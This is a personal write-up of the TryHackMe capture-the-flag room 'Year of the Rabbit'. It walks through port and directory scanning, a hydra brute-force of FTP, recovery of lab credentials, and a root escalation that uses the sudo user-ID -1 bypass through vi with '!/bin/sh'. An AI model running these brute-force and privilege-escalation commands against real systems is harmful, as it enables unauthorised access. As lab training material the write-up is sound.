https://tryhackme.com/room/yearoftherabbit
![[Year of the Rabbit.png]]
## Port scanning

[[nmap]] scan
```
┌──(azam㉿kali)-[~]
└─$ nmap -vvv 10.10.207.244                
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-18 02:50 +06
Initiating Ping Scan at 02:50
Scanning 10.10.207.244 [4 ports]
Completed Ping Scan at 02:50, 0.40s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 02:50
Completed Parallel DNS resolution of 1 host. at 02:50, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 02:50
Scanning 10.10.207.244 [1000 ports]
Discovered open port 80/tcp on 10.10.207.244
Discovered open port 21/tcp on 10.10.207.244
Discovered open port 22/tcp on 10.10.207.244
Completed SYN Stealth Scan at 02:50, 2.06s elapsed (1000 total ports)
Nmap scan report for 10.10.207.244
Host is up, received reset ttl 63 (0.19s latency).
Scanned at 2025-04-18 02:50:24 +06 for 2s
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 2.62 seconds
           Raw packets sent: 1004 (44.152KB) | Rcvd: 1001 (40.052KB)
                                                                                                                                       
┌──(azam㉿kali)-[~]
└─$ nmap -T5 -A -p21,22,80 10.10.207.244
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-18 02:50 +06
Nmap scan report for 10.10.207.244
Host is up (0.19s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA)
|   2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA)
|   256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA)
|_  256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519)
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Apache2 Debian Default Page: It works
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.4
OS details: Linux 4.4
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   179.29 ms 10.21.0.1
2   179.50 ms 10.10.207.244

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.39 seconds

```

## Directory finding

[[gobuster]] scan
```
┌──(azam㉿kali)-[~]
└─$ gobuster dir -u http://10.10.207.244/ -x html,txt,php,js,py -w /usr/share/wordlists/dirb/common.txt -t 100
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.207.244/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              py,html,txt,php,js
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta.js              (Status: 403) [Size: 278]
/.php                 (Status: 403) [Size: 278]
/.hta.txt             (Status: 403) [Size: 278]
/.html                (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd.txt        (Status: 403) [Size: 278]
/.htaccess.html       (Status: 403) [Size: 278]
/.htpasswd.php        (Status: 403) [Size: 278]
/.hta.py              (Status: 403) [Size: 278]
/.htpasswd.js         (Status: 403) [Size: 278]
/.htpasswd.py         (Status: 403) [Size: 278]
/.hta                 (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.hta.html            (Status: 403) [Size: 278]
/.htaccess.js         (Status: 403) [Size: 278]
/.htpasswd.html       (Status: 403) [Size: 278]
/.htaccess.py         (Status: 403) [Size: 278]
/.hta.php             (Status: 403) [Size: 278]
/.htaccess.txt        (Status: 403) [Size: 278]
/.htaccess.php        (Status: 403) [Size: 278]
/assets               (Status: 301) [Size: 315] [--> http://10.10.207.244/assets/]
/index.html           (Status: 200) [Size: 7853]
/index.html           (Status: 200) [Size: 7853]
/server-status        (Status: 403) [Size: 278]
Progress: 27684 / 27690 (99.98%)
===============================================================
Finished
===============================================================

```

![[0001.png]]

## Metadata wathing

[[exiftool]] scanto see the video metadata
```
┌──(azam㉿kali)-[~/Downloads]
└─$ exiftool RickRolled.mp4 
ExifTool Version Number         : 13.10
File Name                       : RickRolled.mp4
Directory                       : .
File Size                       : 402 MB
File Modification Date/Time     : 2025:04:18 13:03:17+06:00
File Access Date/Time           : 2025:04:18 13:03:21+06:00
File Inode Change Date/Time     : 2025:04:18 13:03:17+06:00
File Permissions                : -rw-rw-r--
File Type                       : MP4
File Type Extension             : mp4
MIME Type                       : video/mp4
Major Brand                     : MP4 Base Media v1 [IS0 14496-12:2003]
Minor Version                   : 0.2.0
Compatible Brands               : isom, iso2, avc1, mp41
Media Data Size                 : 402091953
Media Data Offset               : 48
Movie Header Version            : 0
Create Date                     : 0000:00:00 00:00:00
Modify Date                     : 0000:00:00 00:00:00
Time Scale                      : 1000
Duration                        : 0:03:32
Preferred Rate                  : 1
Preferred Volume                : 100.00%
Preview Time                    : 0 s
Preview Duration                : 0 s
Poster Time                     : 0 s
Selection Time                  : 0 s
Selection Duration              : 0 s
Current Time                    : 0 s
Next Track ID                   : 3
Track Header Version            : 0
Track Create Date               : 0000:00:00 00:00:00
Track Modify Date               : 0000:00:00 00:00:00
Track ID                        : 1
Track Duration                  : 0:03:32
Track Layer                     : 0
Track Volume                    : 0.00%
Image Width                     : 1280
Image Height                    : 720
Graphics Mode                   : srcCopy
Op Color                        : 0 0 0
Compressor ID                   : avc1
Source Image Width              : 1280
Source Image Height             : 720
X Resolution                    : 72
Y Resolution                    : 72
Bit Depth                       : 24
Video Frame Rate                : 30.005
Matrix Structure                : 1 0 0 0 1 0 0 0 1
Media Header Version            : 0
Media Create Date               : 0000:00:00 00:00:00
Media Modify Date               : 0000:00:00 00:00:00
Media Time Scale                : 48000
Media Duration                  : 0:03:32
Media Language Code             : und
Handler Description             : SoundHandler
Balance                         : 0
Audio Format                    : mp4a
Audio Channels                  : 2
Audio Bits Per Sample           : 16
Audio Sample Rate               : 48000
Handler Type                    : Metadata
Handler Vendor ID               : Apple
Encoder                         : Lavf57.83.100
Image Size                      : 1280x720
Megapixels                      : 0.922
Avg Bitrate                     : 15.2 Mbps
Rotation                        : 0

```
finding nothing spatial

## Go to action

In css file we find 
![[0003.png]]

open a new tab 
![[0004.png]]

![[0005.png]]

now open [[burp-suit]] and search it
http://10.10.178.221/sup3r_s3cr3t_fl4g.php
![[0006.png]]

after foreword we find a hidden directory
GET /intermediary.php?hidden_directory=/WExYY2Cv-qU HTTP/1.1
![[0007.png]]

the directory give us a photo
![[0008.png]]
![[0002.png]]

after i use [[strings]] tool
```
strings Hot_Babe.png
```
![[0009.png]]
here  we see our user name for ftp is `ftpuser` and here is the list of password

so we need to make a brute force using [[hydra]]
```
hydra -l ftpuser -P pass ftp://10.10.178.221 -t 64 -V -f
```
![[0010.png]]

now we get access by ftp
```
┌──(azam㉿kali)-[~/Desktop/try/vid]
└─$ ftp 10.10.178.221                                                                                
Connected to 10.10.178.221.
220 (vsFTPd 3.0.2)
Name (10.10.178.221:azam): ftpuser
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||55212|).
150 Here comes the directory listing.
-rw-r--r--    1 0        0             758 Jan 23  2020 Eli's_Creds.txt
226 Directory send OK.
ftp> mget *
mget Eli's_Creds.txt [anpqy?]? y
229 Entering Extended Passive Mode (|||50496|).
150 Opening BINARY mode data connection for Eli's_Creds.txt (758 bytes).
100% |******************************************************************************************|   758        7.30 MiB/s    00:00 ETA
226 Transfer complete.
758 bytes received in 00:00 (3.82 KiB/s)
ftp> bye
221 Goodbye.
```

we get a file name Eli's_Creds.txt
If we read the file
![[0011.png]]

This is call **Brainfuck program** and if we run the code we will find username and password
https://copy.sh/brainfuck/
![[0012.png]]

## Last part of getting root

User: eli
Password: DSpDiM1wAEwid

we will make ssh connection using this
![[0013.png]]

after we login there is a massage too see a hidden massage location `s3cr3t` 

```
eli@year-of-the-rabbit:/tmp$ locate s3cr3t
/usr/games/s3cr3t
/usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
/var/www/html/sup3r_s3cr3t_fl4g.php
eli@year-of-the-rabbit:/tmp$ cat /usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
Your password is awful, Gwendoline. 
It should be at least 60 characters long! Not just MniVCQVhQHUNI
Honestly!
```
usernama: gwendoline
password: MniVCQVhQHUNI

```
gwendoline@year-of-the-rabbit:~$ sudo -l
Matching Defaults entries for gwendoline on year-of-the-rabbit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
```

we use this
```
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
```
then 
```
!/bin/sh
```

![[0014.png]]


#ctf #tryhackme #tryhackme_ctf 